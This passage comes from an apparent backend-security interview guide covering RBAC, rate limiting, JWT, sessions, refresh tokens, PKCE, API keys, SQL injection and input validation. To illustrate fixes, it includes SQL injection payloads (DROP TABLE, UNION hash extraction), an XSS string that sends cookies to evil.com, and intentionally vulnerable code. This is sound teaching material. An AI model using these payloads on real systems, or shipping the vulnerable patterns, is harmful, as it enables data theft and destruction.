   This is functionally equivalent to `*` with credentials — any site can make authenticated requests.

2. **Weak origin validation:**
   ```typescript
   // DANGEROUS — attacker registers evil-example.com
   if (origin.endsWith('example.com')) { allow(); }
   ```
   Use an exact allowlist, not substring/suffix matching.

3. **Allowing `null` origin:** The `null` origin comes from sandboxed iframes and local files — allowing it lets attackers craft requests from controlled environments.

4. **Overly broad `Access-Control-Allow-Headers`:** Allowing all headers increases attack surface.

**Correct implementation:**

```typescript
const ALLOWED_ORIGINS = new Set([
  'https://app.example.com',
  'https://staging.example.com',
]);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin && ALLOWED_ORIGINS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin'); // critical for caching correctness
  }
  // Don't set CORS headers for unknown origins — browser blocks the response
  next();
});
```

The `Vary: Origin` header is frequently overlooked — without it, a CDN or browser cache might serve a CORS response for origin A to a request from origin B.

</details>

<details>
<summary>13. Why is role-based access control (RBAC) the dominant authorization model for backend APIs — what problem does it solve that simple user-level checks don't, how does the user → roles → permissions hierarchy work, what's the critical difference between checking roles vs checking permissions (and why checking roles directly is a common mistake), and when does RBAC fall short requiring ABAC or policy engines like OPA?</summary>

**Why RBAC dominates:**

Without RBAC, you end up with per-user permission assignments — managing individual permissions for thousands of users is unscalable. When a new feature launches, you'd need to update every user's permissions individually. RBAC groups common permission sets into roles, so you manage roles (a handful) instead of individual user-permission mappings (thousands).

**The hierarchy:**

```
User → Roles → Permissions

User "alice" → Role "editor" → Permissions: ["articles:read", "articles:write", "articles:publish"]
User "bob"   → Role "viewer" → Permissions: ["articles:read"]
```

- **Users** are assigned one or more **roles**
- **Roles** are collections of **permissions**
- **Permissions** are granular capabilities (resource:action pairs)

When Alice gets promoted, you change her role from "editor" to "admin" — one change, not 20 permission updates.

**Checking roles vs checking permissions — the critical difference:**

```typescript
// BAD — checking roles directly
if (user.role === 'admin') {
  allowDelete();
}
```

This is brittle because:
- Adding a new role "super-editor" that should also delete requires changing code
- Role names become hardcoded across the codebase
- You can't grant specific permissions without creating new roles

```typescript
// GOOD — checking permissions
if (user.permissions.includes('articles:delete')) {
  allowDelete();
}
```

This is flexible because:
- Any role can be granted the `articles:delete` permission without code changes
- Permissions are stable — role definitions can change without touching authorization logic
- The code doesn't need to know about the role hierarchy

**The principle**: roles are an organizational tool for grouping permissions. The code should never know about roles — only permissions. Role-to-permission mapping lives in configuration (database, config file), not in application code.

**When RBAC falls short — ABAC and policy engines:**

RBAC can't express rules that depend on **context or attributes**:

- "Users can only edit their own documents" (ownership)
- "Doctors can view records only for patients in their department" (relationship)
- "API access is only allowed from approved IP ranges during business hours" (environmental)
- "A manager can approve expenses up to $10,000, but a director can approve up to $100,000" (attribute-based thresholds)

These require **Attribute-Based Access Control (ABAC)** — policies that evaluate attributes of the user, the resource, the action, and the environment.

**OPA (Open Policy Agent)** is the standard tool for this. You define policies in Rego (OPA's policy language), and your services query OPA for authorization decisions:

```
# OPA policy (Rego) — `input` is the standard request object in Rego
allow {
  input.action == "edit"
  input.resource.owner == input.user.id   # ownership check
}

allow {
  input.action == "approve_expense"
  input.resource.amount <= input.user.approval_limit  # attribute threshold
}
```

**Practical recommendation**: Start with RBAC — it covers 80-90% of authorization needs and is simple to implement and reason about. Add ABAC/OPA when you hit the ownership or attribute-based scenarios that roles can't express. Many systems use RBAC for coarse-grained access (can this user access this API at all?) and ABAC for fine-grained decisions (can this user access this specific resource?).

</details>

<details>
<summary>14. Why is rate limiting essential specifically for authentication endpoints beyond general API rate limiting — what threat models does it address (credential stuffing, brute force, account enumeration), how do per-IP vs per-account vs combined strategies differ in effectiveness, and what are the tradeoffs between blocking, throttling, and CAPTCHA escalation?</summary>

**Why auth endpoints need special treatment:**

General API rate limiting (e.g., 1000 req/min per user) protects against abuse and ensures fair resource usage. Auth endpoints face fundamentally different threats where even moderate request volumes cause damage:

- **Brute force**: Trying many passwords against one account. At 10 attempts/second with no rate limit, a 6-character password falls in hours.
- **Credential stuffing**: Using leaked username/password pairs from other breaches. Attackers try millions of known credentials — even a 0.1% success rate yields thousands of compromised accounts.
- **Account enumeration**: Distinguishing valid usernames from invalid ones based on response differences ("password incorrect" vs "account not found"). This builds a list of valid accounts for targeted attacks.

These attacks don't need high throughput — they need persistence. A brute-force attack at 1 request per second per IP (well under general rate limits) is still effective if not specifically limited.

**Per-IP vs per-account vs combined strategies:**

| Strategy | Protects against | Weakness |
|---|---|---|
| **Per-IP** (e.g., 10 login attempts/min per IP) | Brute force from single source | Distributed attacks using botnets/proxies rotate IPs |
| **Per-account** (e.g., 5 failures per account/hour) | Credential stuffing targeting specific accounts | Attacker can lock out legitimate users (DoS via lockout) |
| **Combined** (per-IP AND per-account) | Both attack vectors | More complex to implement, but covers both weaknesses |

The combined approach is the right default. Per-IP catches unsophisticated attacks, per-account catches distributed attacks targeting specific users.

**Additional dimension — global rate**: Monitor total failed login rate across all accounts. A sudden spike indicates a credential stuffing campaign even if per-IP and per-account thresholds aren't hit individually.

**Response strategies — blocking vs throttling vs CAPTCHA:**

| Response | How it works | Tradeoff |
|---|---|---|
| **Hard block (429)** | Reject requests for a cooldown period | Simple, but reveals you've detected the attack; attacker can lock out users |
| **Throttling (progressive delay)** | Add increasing delay (1s, 2s, 4s, 8s...) before responding | Slows attacks without blocking legitimate users, but ties up server connections |
| **CAPTCHA escalation** | Show CAPTCHA after N failures | Allows legitimate users to proceed while stopping bots, but degrades UX |
| **Silent failure** | Accept the request but respond generically after a delay | Doesn't reveal detection to the attacker, but wastes compute on processing |

**Practical recommendation — layered escalation:**

1. **0-3 failures**: Normal login flow
2. **4-6 failures**: Add CAPTCHA challenge
3. **7-10 failures**: Progressive delays (doubling each time)
4. **10+ failures**: Temporary account lockout (15-30 min) with email notification to the account holder

For account enumeration, always return the same response regardless of whether the account exists: "If an account with that email exists, you'll receive a password reset link." Never differentiate between "user not found" and "wrong password" in the response.

The implementation details are covered in question 23.

</details>

## Practical — Authentication Implementation

<details>
<summary>15. Implement JWT-based authentication with RS256 in a Node.js API — show the token generation (signing with a private key), verification middleware (verifying with a public key), and explain why RS256 is preferred over HS256 for microservices, how to handle token expiration, and what claims to include in the payload</summary>

**Key generation** (done once, stored securely):

```bash
# Generate RSA key pair
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
```

**Token generation — the auth service (has the private key):**

```typescript
import { readFileSync } from 'node:fs';
import jwt from 'jsonwebtoken';

const PRIVATE_KEY = readFileSync('./private.pem', 'utf8');

interface TokenPayload {
  sub: string;      // user ID — who this token represents
  email: string;    // useful for logging/display without DB lookup
  roles: string[];  // authorization data
  projectKey: string; // tenant scoping (multi-tenant systems)
}

function generateAccessToken(user: TokenPayload): string {
  return jwt.sign(
    {
      sub: user.sub,
      email: user.email,
      roles: user.roles,
      projectKey: user.projectKey,
    },
    PRIVATE_KEY,
    {
      algorithm: 'RS256',
      expiresIn: '15m',         // short-lived
      issuer: 'auth.myapp.com', // identifies the issuing service
      audience: 'api.myapp.com', // intended consumer
    }
  );
}
```

**Claims to include:**

- **Standard**: `sub` (user ID), `iss` (issuer), `aud` (audience), `exp` (expiration), `iat` (issued at)
- **Custom**: roles/permissions, tenant ID, email — only what services need to authorize requests without a DB call
- **Never include**: passwords, full PII, sensitive data — the payload is base64-encoded, not encrypted

**Verification middleware — any service (only needs the public key):**

```typescript
import jwt from 'jsonwebtoken';

const PUBLIC_KEY = readFileSync('./public.pem', 'utf8');

interface AuthenticatedRequest extends Request {
  user: TokenPayload & { iat: number; exp: number };
}

function authenticate(req: Request, res: Response, next: NextFunction): void {
  const authHeader = req.headers.authorization;
  if (!authHeader?.startsWith('Bearer ')) {
    res.status(401).json({ error: 'Missing bearer token' });
    return;
  }

  const token = authHeader.slice(7);

  try {
    const decoded = jwt.verify(token, PUBLIC_KEY, {
      algorithms: ['RS256'],   // CRITICAL: restrict to expected algorithm
      issuer: 'auth.myapp.com',
      audience: 'api.myapp.com',
    }) as AuthenticatedRequest['user'];

    (req as AuthenticatedRequest).user = decoded;
    next();
  } catch (err) {
    if (err instanceof jwt.TokenExpiredError) {
      res.status(401).json({ error: 'Token expired' });
      return;
    }
    res.status(401).json({ error: 'Invalid token' });
  }
}
```

**Why `algorithms: ['RS256']` is critical**: Without this, an attacker could craft a token with `"alg": "HS256"` and sign it with the public key (which is publicly known). The server would then verify with the public key using HS256, and the token would pass validation. Always explicitly restrict the accepted algorithm.

**Why RS256 over HS256 for microservices** (as covered in question 4): The auth service holds the private key and is the only one that can issue tokens. All other services hold only the public key — they can verify but can't forge tokens. With HS256, every service shares the same secret and can both sign and verify, violating least privilege.

**Handling token expiration:**

- Set short `expiresIn` (5-15 minutes) on access tokens
- The `jwt.verify` call automatically rejects expired tokens
- Pair with refresh tokens (covered in question 17) so users don't re-authenticate every 15 minutes
- For JWKS-based key rotation, publish public keys at `/.well-known/jwks.json` so services can fetch updated keys automatically

</details>

<details>
<summary>16. Implement session-based authentication with secure cookie configuration in a Node.js application — show the session creation on login, the cookie settings (HttpOnly, Secure, SameSite, path, maxAge), session regeneration after authentication, and explain what each flag prevents</summary>

Building on the cookie security concepts from question 6, here's the full implementation:

```typescript
import express from 'express';
import session from 'express-session';
import RedisStore from 'connect-redis';
import { createClient } from 'redis';
import bcrypt from 'bcrypt';

const app = express();
const redisClient = createClient({ url: process.env.REDIS_URL });
await redisClient.connect();

app.use(session({
  store: new RedisStore({ client: redisClient }),
  name: 'sid',           // custom name — don't use default 'connect.sid' (reveals tech stack)
  secret: process.env.SESSION_SECRET!,
  resave: false,          // don't save session if unmodified
  saveUninitialized: false, // don't create session until something is stored
  cookie: {
    httpOnly: true,       // prevents XSS from reading cookie via document.cookie
    secure: true,         // cookie only sent over HTTPS — prevents network sniffing
    sameSite: 'lax',      // prevents CSRF — cookie not sent on cross-origin POST
    path: '/',            // cookie available on all paths
    maxAge: 24 * 60 * 60 * 1000, // 24 hours — limits exposure window
    domain: '.myapp.com', // shared across subdomains if needed
  },
}));

app.use(express.json());
```

**Login with session regeneration:**

```typescript
app.post('/login', async (req, res) => {
  const { email, password } = req.body;

  const user = await db.users.findByEmail(email);
  if (!user) {
    // Same response for invalid email and password — prevents account enumeration
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const valid = await bcrypt.compare(password, user.passwordHash);
  if (!valid) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // CRITICAL: Regenerate session ID after authentication
  // Prevents session fixation — attacker's pre-set session ID becomes useless
  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ error: 'Session error' });

    // Attach user data to the new session
    req.session.userId = user.id;
    req.session.roles = user.roles;
    req.session.createdAt = Date.now();

    // Save explicitly to ensure data is persisted before responding
    req.session.save((err) => {
      if (err) return res.status(500).json({ error: 'Session error' });
      res.json({ message: 'Logged in', user: { id: user.id, email: user.email } });
    });
  });
});
```

**Session authentication middleware:**

```typescript
function requireAuth(req: Request, res: Response, next: NextFunction): void {
  if (!req.session?.userId) {
    res.status(401).json({ error: 'Not authenticated' });
    return;
  }
  next();
}

app.get('/profile', requireAuth, async (req, res) => {
  const user = await db.users.findById(req.session.userId);
  res.json({ user });
});
```

**Logout — immediate revocation:**

```typescript
app.post('/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) return res.status(500).json({ error: 'Logout failed' });
    res.clearCookie('sid'); // remove cookie from browser
    res.json({ message: 'Logged out' });
  });
});
```

**What each flag prevents — summary:**

| Flag | Attack prevented |
|---|---|
| `httpOnly: true` | XSS cookie theft (JavaScript can't access the cookie) |
| `secure: true` | Network sniffing on unencrypted connections |
| `sameSite: 'lax'` | CSRF attacks (cross-site form submissions don't include the cookie) |
| `maxAge` | Limits window if cookie is stolen; forces re-authentication |
| Custom `name` | Information disclosure (default name reveals framework) |
| `saveUninitialized: false` | Prevents empty sessions from consuming storage; important for GDPR (no cookie without user consent/action) |

**Why `sameSite: 'lax'` over `'strict'`**: Strict blocks the cookie even on top-level navigations (clicking a link from email to your site would arrive without a session). Lax allows cookies on safe top-level navigations (GET) but blocks them on cross-origin POST/PUT/DELETE, which is where CSRF attacks happen. Lax is the right default for most applications.

</details>

<details>
<summary>17. Implement refresh token rotation with reuse detection — show the flow where a refresh token is single-use (exchanged for a new access + refresh token pair), how to detect when a previously-used refresh token is resubmitted (indicating theft), and how token family tracking invalidates all tokens in the compromised family</summary>

Building on the concepts from question 7, here's the full implementation:

**Data model:**

```typescript
interface RefreshTokenRecord {
  id: string;           // the token value (hashed for storage)
  familyId: string;     // links all tokens from the same login session
  userId: string;
  used: boolean;         // true after it's been exchanged
  expiresAt: Date;
  createdAt: Date;
}
```

**Token generation utilities:**

```typescript
import { randomBytes, createHash } from 'node:crypto';
import jwt from 'jsonwebtoken';

function generateRefreshToken(): string {
  return randomBytes(40).toString('hex'); // 320 bits, opaque
}

function hashToken(token: string): string {
  return createHash('sha256').update(token).digest('hex');
}

function generateFamilyId(): string {
  return randomBytes(16).toString('hex');
}
```

**Login — creates the first token in a new family:**

```typescript
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body.email, req.body.password);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });

  const familyId = generateFamilyId();
  const { accessToken, refreshToken } = await issueTokenPair(user.id, familyId);

  res.json({ accessToken, refreshToken });
});

async function issueTokenPair(userId: string, familyId: string) {
  const accessToken = generateAccessToken({ sub: userId }); // RS256, 15min expiry

  const refreshToken = generateRefreshToken();
  await db.refreshTokens.create({
    id: hashToken(refreshToken),
    familyId,
    userId,
    used: false,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000), // 7 days
    createdAt: new Date(),
  });

  return { accessToken, refreshToken };
}
```

**Token refresh with rotation and reuse detection:**

```typescript
app.post('/token/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  if (!refreshToken) return res.status(400).json({ error: 'Missing refresh token' });

  const tokenHash = hashToken(refreshToken);
  const tokenRecord = await db.refreshTokens.findOne({ id: tokenHash });

  // Token doesn't exist or is expired
  if (!tokenRecord || tokenRecord.expiresAt < new Date()) {
    return res.status(401).json({ error: 'Invalid refresh token' });
  }

  // REUSE DETECTED — token was already used
  if (tokenRecord.used) {
    // Invalidate the ENTIRE family — both attacker and user are logged out
    await db.refreshTokens.deleteMany({ familyId: tokenRecord.familyId });

    // Alert: log this as a security event
    console.error(`Refresh token reuse detected for user ${tokenRecord.userId}, family ${tokenRecord.familyId}`);

    return res.status(401).json({ error: 'Token reuse detected. Please re-authenticate.' });
  }

  // Mark current token as used (single-use enforcement)
  await db.refreshTokens.updateOne({ id: tokenHash }, { used: true });

  // Issue new token pair in the same family
  const { accessToken, refreshToken: newRefreshToken } = await issueTokenPair(
    tokenRecord.userId,
    tokenRecord.familyId // same family — the chain continues
  );

  res.json({ accessToken, refreshToken: newRefreshToken });
});
```

**How reuse detection catches theft:**

```
Timeline:
1. User logs in → gets refresh token RT1 (family: F1)
2. Attacker steals RT1
3. Attacker uses RT1 → gets RT2 (RT1 marked used)
4. User tries RT1 → REUSE DETECTED → entire family F1 invalidated
   (Both RT1 and RT2 are now dead. Attacker and user must re-authenticate.)

OR:

3. User uses RT1 → gets RT2 (RT1 marked used)
4. Attacker tries RT1 → REUSE DETECTED → entire family F1 invalidated
```

Either way, the theft is detected and the damage is contained.

**Cleanup — periodic maintenance:**

```typescript
// Cron job: remove expired and used tokens
async function cleanupRefreshTokens(): Promise<void> {
  await db.refreshTokens.deleteMany({
    $or: [
      { expiresAt: { $lt: new Date() } },
      // Keep used tokens for reuse detection window, then clean up
      { used: true, createdAt: { $lt: new Date(Date.now() - 24 * 60 * 60 * 1000) } },
    ],
  });
}
```

**Gotcha**: Don't delete used tokens immediately — you need them to exist for reuse detection. Keep them for at least 24 hours (or the refresh token's max lifetime) before cleaning up.

</details>

<details>
<summary>18. Implement the OAuth 2.0 Authorization Code flow with PKCE for a single-page application — show the authorization request (with code_challenge), the callback that exchanges the code for tokens (with code_verifier), and explain why PKCE prevents the authorization code interception attack that made the Implicit flow insecure</summary>

Building on the OAuth 2.0 concepts from question 8, here's a full SPA implementation:

**Step 1: Generate PKCE values and redirect to authorization server:**

```typescript
// utils/pkce.ts — runs in the browser
async function generateCodeVerifier(): Promise<string> {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  return base64UrlEncode(array);
}

async function generateCodeChallenge(verifier: string): Promise<string> {
  const encoder = new TextEncoder();
  const data = encoder.encode(verifier);
  const digest = await crypto.subtle.digest('SHA-256', data);
  return base64UrlEncode(new Uint8Array(digest));
}

function base64UrlEncode(buffer: Uint8Array): string {
  const base64 = btoa(String.fromCharCode(...buffer));
  return base64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

// Initiate login
async function startLogin(): Promise<void> {
  const codeVerifier = await generateCodeVerifier();
  const codeChallenge = await generateCodeChallenge(codeVerifier);
  const state = crypto.randomUUID(); // CSRF protection

  // Store in sessionStorage — survives the redirect, cleared when tab closes
  sessionStorage.setItem('code_verifier', codeVerifier);
  sessionStorage.setItem('oauth_state', state);

  const params = new URLSearchParams({
    response_type: 'code',
    client_id: 'my-spa-client-id',
    redirect_uri: 'https://myapp.com/callback',
    scope: 'openid profile email',
    code_challenge: codeChallenge,
    code_challenge_method: 'S256',
    state,
  });

  window.location.href = `https://auth.example.com/authorize?${params}`;
}
```

**Step 2: Handle the callback — exchange code for tokens:**

```typescript
// callback.ts — runs when auth server redirects back
async function handleCallback(): Promise<void> {
  const params = new URLSearchParams(window.location.search);
  const code = params.get('code');
  const state = params.get('state');
  const error = params.get('error');

  if (error) {
    throw new Error(`OAuth error: ${error}`);
  }

  // Verify state matches — prevents CSRF
  const savedState = sessionStorage.getItem('oauth_state');
  if (state !== savedState) {
    throw new Error('State mismatch — possible CSRF attack');
  }

  const codeVerifier = sessionStorage.getItem('code_verifier');
  if (!code || !codeVerifier) {
    throw new Error('Missing code or verifier');
  }

  // Exchange code for tokens — SPA makes this call directly (no backend needed with PKCE)
  const response = await fetch('https://auth.example.com/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      code,
      redirect_uri: 'https://myapp.com/callback',
      client_id: 'my-spa-client-id',
      code_verifier: codeVerifier, // PKCE proof — proves we initiated the request
    }),
  });

  const tokens = await response.json();
  // tokens: { access_token, id_token, refresh_token, expires_in, token_type }

  // Clean up — don't leave PKCE values around
  sessionStorage.removeItem('code_verifier');
  sessionStorage.removeItem('oauth_state');

  // Store tokens (in memory for access token, secure storage for refresh token)
  storeTokens(tokens);
}
```

**Why PKCE prevents the authorization code interception attack:**

The attack that killed Implicit flow and that PKCE prevents:

1. Attacker intercepts the authorization code during the redirect (via malicious browser extension, open redirect vulnerability, or shared device)
2. Without PKCE, the attacker sends the code to the token endpoint and gets tokens — the auth server has no way to verify the legitimate client from the attacker

With PKCE:

```
Client generates: code_verifier = "random-secret-string"
Client computes:  code_challenge = SHA256(code_verifier) = "abc123..."

Step 1: Client sends code_challenge to auth server (in the authorize URL)
Step 2: Auth server stores code_challenge alongside the authorization code
Step 3: Attacker intercepts the code during redirect
Step 4: Attacker sends code to token endpoint BUT doesn't have code_verifier
Step 5: Auth server computes SHA256(attacker's_verifier) — doesn't match stored challenge
Step 6: Token exchange REJECTED
```

The attacker has the code but can't prove they initiated the flow because they don't have the `code_verifier` (it was generated in the client's memory and never transmitted over the redirect). The SHA-256 hash is one-way, so knowing the `code_challenge` doesn't help recover the verifier.

**Backend-for-Frontend (BFF) alternative**: For SPAs that need maximum security, route the token exchange through a backend proxy. The backend holds the `client_secret`, stores tokens in HttpOnly cookies, and the SPA never touches tokens directly. PKCE is still recommended even in this pattern as defense-in-depth.

</details>

<details>
<summary>19. Build an API key authentication system — show how to generate cryptographically random keys, store them hashed (with a prefix for identification), verify incoming keys efficiently, implement key rotation (issuing a new key while the old one remains valid for a grace period), and explain the tradeoffs vs bearer tokens</summary>

Using the `generateApiKey`, `hashKey`, and `ApiKeyRecord` foundations from question 10 (key generation with `randomBytes(32)`, SHA-256 hashing, and the record schema with prefix, hash, scopes, expiration). Here's the full CRUD system built on top:

**Key creation endpoint:**

```typescript
app.post('/api-keys', requireAuth, async (req, res) => {
  const { label, scopes, expiresInDays } = req.body;

  const { fullKey, prefix, hash } = generateApiKey('live');

  await db.apiKeys.create({
    id: randomBytes(16).toString('hex'),
    hash,
    prefix,
    label,
    userId: req.user.id,
    scopes,
    expiresAt: expiresInDays
      ? new Date(Date.now() + expiresInDays * 86400000)
      : null,
    revokedAt: null,
    lastUsedAt: null,
    createdAt: new Date(),
  });

  // Return the full key ONCE — it cannot be retrieved again
  res.status(201).json({
    key: fullKey,        // only time this is shown
    prefix,
    label,
    message: 'Store this key securely. It cannot be retrieved again.',
  });
});
```

**Verification middleware:**

```typescript
async function authenticateApiKey(
  req: Request, res: Response, next: NextFunction
): Promise<void> {
  const key = req.headers['x-api-key'] as string;
  if (!key) {
    res.status(401).json({ error: 'Missing API key' });
    return;
  }

  const hash = hashKey(key);
  const record = await db.apiKeys.findOne({
    hash,
    revokedAt: null,
    $or: [{ expiresAt: null }, { expiresAt: { $gt: new Date() } }],
  });

  if (!record) {
    res.status(401).json({ error: 'Invalid API key' });
    return;
  }

  // Track usage (fire-and-forget, don't block the request)
  db.apiKeys.updateOne({ id: record.id }, { lastUsedAt: new Date() }).catch(() => {});

  req.apiKey = record;
  next();
}

// Scope-checking middleware
function requireScopes(...requiredScopes: string[]) {
  return (req: Request, res: Response, next: NextFunction) => {
    const hasAll = requiredScopes.every(s => req.apiKey.scopes.includes(s));
    if (!hasAll) {
      res.status(403).json({ error: 'Insufficient scopes' });
      return;
    }
    next();
  };
}

// Usage
app.get('/orders', authenticateApiKey, requireScopes('orders:read'), listOrders);
```

**Key rotation — overlapping validity:**

```typescript
app.post('/api-keys/:id/rotate', requireAuth, async (req, res) => {
  const oldKey = await db.apiKeys.findOne({ id: req.params.id, userId: req.user.id });
  if (!oldKey) return res.status(404).json({ error: 'Key not found' });

  // Generate new key with same scopes
  const { fullKey, prefix, hash } = generateApiKey('live');

  await db.apiKeys.create({
    id: randomBytes(16).toString('hex'),
    hash,
    prefix,
    label: `${oldKey.label} (rotated)`,
    userId: req.user.id,
    scopes: oldKey.scopes,
    expiresAt: oldKey.expiresAt,
    revokedAt: null,
    lastUsedAt: null,
    createdAt: new Date(),
  });

  // Set grace period on old key — both keys work during transition
  const gracePeriod = new Date(Date.now() + 24 * 60 * 60 * 1000); // 24 hours
  await db.apiKeys.updateOne({ id: oldKey.id }, {
    expiresAt: oldKey.expiresAt && oldKey.expiresAt < gracePeriod
      ? oldKey.expiresAt  // don't extend past original expiry
      : gracePeriod,
  });

  res.json({
    key: fullKey,
    prefix,
    message: 'Old key will expire in 24 hours. Update your integration.',
  });
});
```

**Tradeoffs vs bearer tokens (OAuth)** are covered in question 10. The key addition here: API keys are simpler for machine-to-machine auth but lack the delegation model, automatic expiration, and standardized revocation that OAuth provides. Use API keys for service integrations and developer APIs; use OAuth for user-facing authentication.

</details>

## Practical — Security Hardening

<details>
<summary>20. Demonstrate SQL injection on a vulnerable query and fix it with parameterized queries — show the vulnerable code (string concatenation), the attack payload, the fix using parameterized/prepared statements (with Prisma, raw SQL, or a query builder), and explain why parameterized queries are immune to injection while escaping is not reliable</summary>

**The vulnerable code — string concatenation:**

```typescript
// VULNERABLE — user input is interpolated directly into SQL
app.get('/users', async (req, res) => {
  const { email } = req.query;
  const result = await db.query(
    `SELECT id, name, email FROM users WHERE email = '${email}'`
  );
  res.json(result.rows);
});
```

**The attack payload:**

```
GET /users?email=' OR '1'='1' --
```

The resulting SQL:
```sql
SELECT id, name, email FROM users WHERE email = '' OR '1'='1' --'
```

`'1'='1'` is always true, `--` comments out the rest. This returns **all users**. Worse payloads:

```
-- Delete the entire table
GET /users?email='; DROP TABLE users; --

-- Extract password hashes
GET /users?email=' UNION SELECT id, password_hash, email FROM users --
```

**Fix 1: Parameterized queries (raw SQL with pg/mysql2):**

```typescript
// SAFE — parameterized query separates SQL from data
app.get('/users', async (req, res) => {
  const { email } = req.query;
  const result = await db.query(
    'SELECT id, name, email FROM users WHERE email = $1',
    [email]  // parameter passed separately — never interpolated into SQL
  );
  res.json(result.rows);
});
```

**Fix 2: Prisma ORM:**

```typescript
// SAFE — Prisma parameterizes automatically
const users = await prisma.user.findMany({
  where: { email: email as string },
  select: { id: true, name: true, email: true },
});

// CAREFUL with raw queries in Prisma — use Prisma.sql for parameterization
const users = await prisma.$queryRaw`
  SELECT id, name, email FROM users WHERE email = ${email}
`;
// Prisma's tagged template literal handles parameterization automatically

// DANGEROUS — Prisma.raw bypasses parameterization
const users = await prisma.$queryRawUnsafe(
  `SELECT * FROM users WHERE email = '${email}'`  // VULNERABLE
);
```

**Fix 3: Knex query builder:**

```typescript
// SAFE — Knex parameterizes automatically
const users = await knex('users')
  .select('id', 'name', 'email')
  .where({ email });
```

**Why parameterized queries are immune to injection:**

The database receives the SQL structure and data as **separate channels**:

1. **SQL template**: `SELECT ... WHERE email = $1` — parsed, compiled, and planned as a query structure
2. **Parameters**: `['user@example.com']` — treated strictly as data values, never as SQL syntax

No matter what the attacker puts in the parameter — `' OR 1=1 --`, `'; DROP TABLE` — the database treats it as a literal string value to match against. The SQL structure is already fixed before the data arrives.

**Why escaping is not reliable:**

```typescript
// Escaping approach — fragile
const safeEmail = email.replace(/'/g, "''"); // escape single quotes
const result = await db.query(`SELECT * FROM users WHERE email = '${safeEmail}'`);
```

Problems with escaping:
- **Encoding bypasses**: Unicode characters, multibyte encoding tricks (like GBK encoding attacks) can bypass string escaping
- **Different databases, different rules**: MySQL, PostgreSQL, and SQLite have different escaping requirements. A function that works for one may not work for another
- **Developer error**: One missed field in a complex query, one forgotten escape call, and you're vulnerable
- **Second-order injection**: Escaped data stored in the database, retrieved later and used in another query without escaping

Parameterized queries make the entire class of injection impossible by design. Escaping tries to make it unlikely — that's a fundamentally weaker guarantee.

</details>

<details>
<summary>21. Implement input validation at an API boundary using Zod or Joi in a Node.js API — show how schema validation prevents mass assignment and injection attacks, demonstrate output encoding that prevents stored XSS when user input is rendered, explain the defense-in-depth principle (why you need both input validation AND output encoding), and show how a poorly written validation regex can create a ReDoS vulnerability</summary>

**Schema validation preventing mass assignment:**

Mass assignment happens when a client sends fields you didn't expect, and your code blindly passes them to the database. Without validation, `POST /users { "name": "Alice", "role": "admin" }` could escalate privileges.

```typescript
import { z } from 'zod';

// Define exactly what the API accepts — everything else is stripped
const CreateUserSchema = z.object({
  name: z.string().min(1).max(100),
  email: z.string().email(),
  password: z.string().min(8).max(128),
});
// Fields like "role", "isAdmin", "id" are NOT in the schema — they're silently dropped

// Validation middleware
function validate(schema: z.ZodSchema) {
  return (req: Request, res: Response, next: NextFunction) => {
    const result = schema.safeParse(req.body);
    if (!result.success) {
      return res.status(400).json({
        error: 'Validation failed',
        issues: result.error.issues.map(i => ({
          path: i.path.join('.'),
          message: i.message,
        })),
      });
    }
    req.body = result.data; // CRITICAL: replace raw body with parsed/stripped data
    next();
  };
}

app.post('/users', validate(CreateUserSchema), async (req, res) => {
  // req.body is guaranteed to only contain name, email, password
  // Even if attacker sent { role: "admin" }, it was stripped by Zod
  const user = await db.users.create(req.body);
  res.status(201).json(user);
});
```

Zod strips unknown keys by default. For stricter enforcement, use `z.strictObject()` which throws on unknown keys instead of stripping them.

**Schema validation reducing injection surface:**

```typescript
const SearchSchema = z.object({
  query: z.string().max(200),
  page: z.number().int().min(1).max(1000).default(1),
  sortBy: z.enum(['name', 'createdAt', 'email']), // allowlist — can't inject arbitrary column names
});

// "sortBy" can only be one of three values — no SQL injection via ORDER BY
```

By constraining types, lengths, and allowed values, schema validation eliminates many injection vectors before input reaches any query.

**Output encoding preventing stored XSS:**

Input validation alone is not enough. Even validated data can contain characters that are dangerous in a different context (HTML, JavaScript, URL). Output encoding makes data safe for its rendering context.

```typescript
// User stored a "bio" that passed validation (it's valid text):
const bio = '<script>document.location="https://evil.com/?c="+document.cookie</script>';

// WITHOUT encoding — XSS attack executes
res.send(`<div class="bio">${bio}</div>`);
// Browser executes the script, cookies are stolen

// WITH encoding — rendered as harmless text
import { encode } from 'he'; // HTML entities library

res.send(`<div class="bio">${encode(bio)}</div>`);
// Output: &lt;script&gt;document.location=...&lt;/script&gt;
// Browser renders it as visible text, not executable code
```

For APIs returning JSON consumed by React/Vue frontends, the frameworks handle encoding automatically when using JSX (`{variable}`) — but server-rendered HTML, email templates, and PDF generation all need explicit encoding.

**Defense-in-depth — why you need both:**

| Layer | What it catches | What it misses |
|---|---|---|
| **Input validation** | Malformed data, wrong types, unexpected fields, overlength strings | Valid-looking data that's dangerous in another context (`<script>` is valid text) |
| **Output encoding** | Context-specific dangers when rendering data | Nothing if applied correctly — but only protects one output context |

Input validation reduces attack surface (blocks obviously bad data). Output encoding neutralizes anything that slips through. Relying on only one creates gaps:

- Validation-only: A bio field containing `<img onerror=alert(1) src=x>` passes string validation but executes as XSS in HTML context.
- Encoding-only: Without validation, you're storing and processing potentially massive or malformed payloads — even if they're encoded safely on output.

**ReDoS — when validation regex becomes the vulnerability:**

```typescript
// DANGEROUS regex — exponential backtracking
const emailRegex = /^([a-zA-Z0-9]+\.)+[a-zA-Z]{2,}$/;

// Attack input: "aaaaaaaaaaaaaaaaaaaaaaaaaaa!"
// The regex engine backtracks exponentially trying to match nested groups
// CPU pegs at 100% for seconds or minutes — denial of service

// The problem: nested quantifiers like (a+)+ create exponential paths
